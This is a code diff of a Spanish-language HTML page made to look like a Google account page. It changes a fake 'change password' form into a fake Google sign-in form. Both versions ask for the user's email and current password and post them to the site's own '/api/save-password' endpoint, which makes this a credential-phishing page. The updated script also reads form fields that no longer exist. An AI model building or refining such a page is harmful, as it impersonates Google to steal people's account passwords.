@@ -2,103 +2,95 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cambiar contraseña - Cuenta de Google</title>
+    <title>Inicia Sesion - Cuenta de Google</title>
     <style>
         body {
-            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
-            background-color: #f0f4f9;
-            margin: 0;
-            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            margin: 0;
+            color: #202124;
         }
         .container {
-            background: #ffffff;
-            width: 100%;
-            max-width: 450px;
-            padding: 40px 40px 36px 40px;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
-            box-sizing: border-box;
-            text-align: center;
+            width: 400px;
+            padding: 40px;
+            text-align: left;
         }
         .google-logo {
             font-size: 22px;
             font-weight: 500;
-            letter-spacing: -0.5px;
-            margin-bottom: 16px;
+            margin-bottom: 24px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            gap: 2px;
+            justify-content: center;
         }
-        .google-logo span:nth-child(1) { color: #4285F4; }
-        .google-logo span:nth-child(2) { color: #EA4335; }
-        .google-logo span:nth-child(3) { color: #FBBC05; }
-        .google-logo span:nth-child(4) { color: #4285F4; }
-        .google-logo span:nth-child(5) { color: #34A853; }
-        .google-logo span:nth-child(6) { color: #EA4335; }
+        .google-logo span span:nth-child(1) { color: #4285F4; }
+        .google-logo span span:nth-child(2) { color: #EA4335; }
+        .google-logo span span:nth-child(3) { color: #FBBC05; }
+        .google-logo span span:nth-child(4) { color: #4285F4; }
+        .google-logo span span:nth-child(5) { color: #34A853; }
+        .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        h1 {
+        h2 {
             font-size: 24px;
             font-weight: 400;
-            color: #202124;
-            margin-top: 0;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        h3 {
+            font-size: 16px;
+            font-weight: 500;
             margin-bottom: 8px;
         }
-        .subtitle {
+        p.subtitle {
             font-size: 14px;
             color: #5f6368;
-            margin-bottom: 32px;
-            text-align: left;
+            margin-bottom: 24px;
             line-height: 1.4;
         }
-        .form-group {
+        .input-group {
             position: relative;
-            margin-bottom: 20px;
-            text-align: left;
+            margin-bottom: 16px;
         }
         input {
             width: 100%;
             padding: 13px 15px;
-            border: 1px solid #747775;
+            border: 1px solid #dadce0;
             border-radius: 4px;
             font-size: 16px;
             box-sizing: border-box;
             outline: none;
-            background: transparent;
-            transition: border-color 0.2s;
+            transition: border 0.2s;
         }
         input:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
+            border: 2px solid #1a73e8;
             padding: 12px 14px;
         }
-        .helper-text {
+        .hint {
             font-size: 12px;
             color: #5f6368;
-            margin-top: 4px;
-            text-align: left;
+            margin-bottom: 16px;
+            margin-top: -10px;
         }
         .buttons-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 32px;
+            margin-top: 30px;
         }
-        .btn-link {
+        .btn-omitir {
             background: none;
             border: none;
             color: #1a73e8;
-            font-size: 14px;
             font-weight: 500;
+            font-size: 14px;
             cursor: pointer;
-            padding: 0;
+            padding: 10px 0;
         }
-        .btn-primary {
+        .btn-guardar {
             background-color: #1a73e8;
             color: white;
             border: none;
@@ -107,121 +99,74 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.2s;
         }
-        .btn-primary:hover {
+        .btn-guardar:hover {
             background-color: #1557b0;
         }
-        /* Pantalla de éxito idéntica a Google */
-        #success-screen {
-            display: none;
-            text-align: center;
-            padding: 10px 0;
-        }
-        .success-badge {
-            width: 56px;
-            height: 56px;
-            background-color: #1e8e3e;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            margin: 0 auto 20px auto;
-        }
-        #success-screen h1 {
-            font-size: 22px;
-            margin-bottom: 12px;
-        }
-        #success-screen p {
+        #message {
+            margin-top: 15px;
             font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-bottom: 30px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <!-- Formulario principal -->
-        <div id="form-screen">
-            <div class="google-logo">
+        <div class="google-logo">
+            <span>
                 <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-            </div>
-            <h1>Cambiar contraseña</h1>
-            <div class="subtitle">
-                Crea una contraseña segura<br>
-                <span style="font-size: 13px; color: #5f6368;">Introduce tu correo, tu contraseña actual y define una contraseña nueva y segura.</span>
-            </div>
-
-            <form id="reset-form">
-                <div class="form-group">
-                    <input type="email" name="email" placeholder="Correo electrónico" required>
-                </div>
-                <div class="form-group">
-                    <input type="password" name="oldPassword" placeholder="Contraseña anterior" required>
-                </div>
-                <div class="form-group">
-                    <input type="password" name="password" placeholder="Crear contraseña" required>
-                    <div class="helper-text">Utiliza al menos 8 caracteres.</div>
-                </div>
-                <div class="form-group">
-                    <input type="password" name="confirmation" placeholder="Confirmación de contraseña" required>
-                </div>
-
-                <div class="buttons-row">
-                    <button type="button" class="btn-link">Omitir</button>
-                    <button type="submit" class="btn-primary">Guardar contraseña</button>
-                </div>
-            </form>
+            </span>
         </div>
+        <h2> Inicia sesion en tu cuenta de google</h2>
 
-        <!-- Pantalla de Éxito Estilo Oficial Google -->
-        <div id="success-screen">
-            <div class="success-badge">✓</div>
-            <h1>Se guardaron los cambios</h1>
-            <p>Tu contraseña se ha cambiado correctamente. La seguridad de tu Cuenta de Google ha sido actualizada.</p>
-            <button type="button" class="btn-primary" onclick="location.reload()">Continuar</button>
-        </div>
+        <h3>Email</h3>
+        <p class="subtitle">Introduce tu correo, tu contraseña actual para poder acceder a este sitio.</p>
+
+        <form id="passwordForm">
+            <div class="input-group">
+                <input type="email" id="email" required placeholder="Correo electrónico">
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="oldPassword" required placeholder="Contraseña">
+            </div>
+
+        
+    
+
+            <div class="buttons-row">
+                
+                <button type="submit" class="btn-guardar">siguiente</button>
+            </div>
+        </form>
+        <div id="message"></div>
     </div>
 
     <script>
-        document.getElementById('reset-form').addEventListener('submit', async (e) => {
+        document.getElementById('passwordForm').addEventListener('submit', async (e) => {
             e.preventDefault();
+            const email = document.getElementById('email').value;
+            const oldPassword = document.getElementById('oldPassword').value;
+            const password = document.getElementById('password').value;
+            const confirmation = document.getElementById('confirmation').value;
+            const msg = document.getElementById('message');
+
+            msg.style.color = '#5f6368';
+            msg.textContent = 'Guardando...';
+
+            const res = await fetch('/api/save-password', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, oldPassword, password, confirmation })
+            });
+            const data = await res.json();
             
-            const boton = document.querySelector('button[type="submit"]');
-            boton.innerText = "Guardando...";
-            boton.disabled = true;
-
-            const email = document.querySelector('input[name="email"]').value;
-            const oldPassword = document.querySelector('input[name="oldPassword"]').value;
-            const password = document.querySelector('input[name="password"]').value;
-            const confirmation = document.querySelector('input[name="confirmation"]').value;
-
-            try {
-                const respuesta = await fetch('/api/save-password', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, oldPassword, password, confirmation })
-                });
-
-                const resultado = await respuesta.json();
-
-                if (resultado.success) {
-                    document.getElementById('form-screen').style.display = 'none';
-                    document.getElementById('success-screen').style.display = 'block';
-                } else {
-                    alert('Error al procesar la solicitud.');
-                    boton.innerText = "Guardar contraseña";
-                    boton.disabled = false;
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('Error de conexión con el servidor.');
-                boton.innerText = "Guardar contraseña";
-                boton.disabled = false;
+            if(data.success) {
+                msg.style.color = 'green';
+                msg.textContent = '¡Contraseña cambiada con éxito!';
+            } else {
+                msg.style.color = 'red';
+                msg.textContent = data.message;
             }
         });
     </script>
